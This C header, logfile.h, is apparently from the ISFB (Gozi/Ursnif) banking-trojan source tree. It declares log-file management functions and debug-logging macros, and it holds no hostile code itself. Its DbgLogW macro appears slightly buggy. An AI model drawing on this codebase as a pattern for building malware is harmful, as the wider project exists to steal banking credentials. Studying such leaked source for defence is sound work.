//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: logfile.h
// $Revision: 250 $
// $Date: 2014-06-09 14:26:38 +0400 (Ον, 09 θών 2014) $
// description:
//	 Creates and manages log file.

#define	 DBG_LOG_LEN	0x200	// chars

// Log file flags
#define	LFF_ACTIVE		1
#define	LFF_TIME		2

//
//	Creates and initilaizes log file
//
WINERROR LogFileInit(
	LPTSTR	pFilePath
	);

//
//	Cleans up a log file
//
VOID LogFileCleanup(VOID);


//
//	Copies current log file to the specified file.
//
WINERROR LogFileCopy(
	LPTSTR	pFilePath
	);


//
//	Writes the specified memory buffer into current log file
//
VOID LogFileAddBuffer(
	PCHAR	pBuffer,
	ULONG	Size
	);


#ifdef _DBG_LOG

#define	DbgLog(args, ...)																								\
{																														\
	CHAR	_Buffer[DBG_LOG_LEN];																						\
	ULONG	_Size = _snprintf((LPSTR)&_Buffer, DBG_LOG_LEN, "[%s:%u] "args, __FUNCTION__, __LINE__, __VA_ARGS__);		\
	LogFileAddBuffer((PCHAR)&_Buffer, _Size);																			\
}																														\

#define	DbgLogW(args, ...)																								\
{																														\
	WCHAR	_Buffer[DBG_LOG_LEN * sizeof(WCHAR)];																		\
	ULONG	_Size = _snwprintf((LPWSTR)&_Buffer, DBG_LOG_LEN, "[%S:%u] "args, __FUNCTION__, __LINE__,  __VA_ARGS__);	\
	LogFileAddBuffer((PCHAR)&_Buffer, _Size * sizeof(WCHAR));															\
}																														\

#else
	#define	DbgLog(args, ...)
	#define	DbgLogW(args, ...)
#endif

